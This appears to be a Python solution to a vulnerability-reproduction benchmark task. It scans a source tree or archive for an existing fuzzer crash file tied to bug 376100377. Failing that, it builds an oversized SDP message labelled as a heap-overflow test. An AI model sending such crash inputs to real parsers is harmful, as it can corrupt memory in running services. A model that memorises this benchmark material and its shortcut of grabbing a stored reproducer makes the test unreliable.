import os
import tarfile
import zipfile
import stat


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = self._find_regression_poc(src_path)
        if poc is not None and len(poc) > 0:
            return poc
        return self._fallback_poc()

    def _find_regression_poc(self, src_path: str):
        target_len = 873
        bug_id = "376100377"
        interesting_name_patterns = [
            bug_id,
            "oss-fuzz",
            "clusterfuzz",
            "crash",
            "poc",
            "sdp",
            "fuzz",
        ]

        backend = None
        if os.path.isdir(src_path):
            backend = "dir"
        else:
            is_tar = False
            is_zip = False
            try:
                is_tar = tarfile.is_tarfile(src_path)
            except Exception:
                is_tar = False
            if not is_tar:
                try:
                    is_zip = zipfile.is_zipfile(src_path)
                except Exception:
                    is_zip = False
            if is_tar:
                backend = "tar"
            elif is_zip:
                backend = "zip"
            else:
                return None

        if backend == "dir":
            def iter_files():
                base = src_path
                for root, dirs, files in os.walk(base):
                    for fname in files:
                        full_path = os.path.join(root, fname)
                        try:
                            st = os.stat(full_path)
                        except OSError:
                            continue
                        if not stat.S_ISREG(st.st_mode):
                            continue
                        size = st.st_size
                        rel = os.path.relpath(full_path, base)

                        def reader(path=full_path):
                            try:
                                with open(path, "rb") as f:
                                    return f.read()
                            except OSError:
                                return b""

                        yield rel, size, reader
        elif backend == "tar":
            def iter_files():
                try:
                    with tarfile.open(src_path, "r:*") as tf:
                        for member in tf.getmembers():
                            if not member.isfile():
                                continue
                            size = member.size
                            name = member.name

                            def reader(name=name):
                                try:
                                    with tarfile.open(src_path, "r:*") as tf2:
                                        try:
                                            m = tf2.getmember(name)
                                        except KeyError:
                                            m = None
                                            for mem in tf2.getmembers():
                                                if mem.name == name:
                                                    m = mem
                                                    break
                                            if m is None:
                                                return b""
                                        f = tf2.extractfile(m)
                                        if f is None:
                                            return b""
                                        try:
                                            data = f.read()
                                        finally:
                                            f.close()
                                        return data
                                except tarfile.TarError:
                                    return b""

                            yield name, size, reader
                except tarfile.TarError:
                    return
        else:  # zip
            def iter_files():
                try:
                    with zipfile.ZipFile(src_path, "r") as zf:
                        for info in zf.infolist():
                            try:
                                is_dir = info.is_dir()
                            except AttributeError:
                                is_dir = info.filename.endswith("/")
                            if is_dir:
                                continue
                            size = info.file_size
                            name = info.filename

                            def reader(name=name):
                                try:
                                    with zipfile.ZipFile(src_path, "r") as zf2:
                                        try:
                                            data = zf2.read(name)
                                        except KeyError:
                                            return b""
                                        return data
                                except zipfile.BadZipFile:
                                    return b""

                            yield name, size, reader
                except zipfile.BadZipFile:
                    return

        size_exact_with_bugid = []
        size_exact_with_interesting = []
        all_size_exact = []
        best_with_bugid_closest = None  # (delta, name, reader)

        for rel_path, size, reader in iter_files():
            if size <= 0 or size > 1000000:
                continue
            name_lower = rel_path.lower()
            has_bugid = bug_id in name_lower
            has_interesting = any(pat in name_lower for pat in interesting_name_patterns)

            if has_bugid:
                delta = abs(size - target_len)
                if best_with_bugid_closest is None or delta < best_with_bugid_closest[0]:
                    best_with_bugid_closest = (delta, rel_path, reader)

            if size == target_len:
                all_size_exact.append((rel_path, size, reader))
                if has_bugid:
                    size_exact_with_bugid.append((rel_path, size, reader))
                elif has_interesting:
                    size_exact_with_interesting.append((rel_path, size, reader))

        def safe_read(rdr):
            try:
                data = rdr()
                if not isinstance(data, (bytes, bytearray)):
                    return None
                if len(data) == 0:
                    return None
                return bytes(data)
            except Exception:
                return None

        if size_exact_with_bugid:
            data = safe_read(size_exact_with_bugid[0][2])
            if data is not None:
                return data

        if size_exact_with_interesting:
            data = safe_read(size_exact_with_interesting[0][2])
            if data is not None:
                return data

        if best_with_bugid_closest is not None and best_with_bugid_closest[0] <= 2048:
            data = safe_read(best_with_bugid_closest[2])
            if data is not None:
                return data

        if all_size_exact:
            prioritised = []
            for rel, size, rdr in all_size_exact:
                low = rel.lower()
                if "sdp" in low or "fuzz" in low:
                    prioritised.append((rel, size, rdr))
            candidates = prioritised if prioritised else all_size_exact
            data = safe_read(candidates[0][2])
            if data is not None:
                return data

        small_interesting = []
        for rel_path, size, reader in iter_files():
            if size <= 0 or size > 4096:
                continue
            name_lower = rel_path.lower()
            if any(pat in name_lower for pat in interesting_name_patterns):
                small_interesting.append((rel_path, size, reader))
        if small_interesting:
            data = safe_read(small_interesting[0][2])
            if data is not None:
                return data

        return None

    def _fallback_poc(self) -> bytes:
        lines = [
            "v=0",
            "o=- 0 0 IN IP4 127.0.0.1",
            "s=HeapOverflowTest",
            "c=IN IP4 127.0.0.1",
            "t=0 0",
        ]
        long_attr = "a=tool:" + "X" * 800
        lines.append(long_attr)
        data = ("\r\n".join(lines) + "\r\n").encode("ascii", "ignore")
        target_len = 873
        if len(data) < target_len:
            data += b"A" * (target_len - len(data))
        else:
            data = data[:target_len]
        return data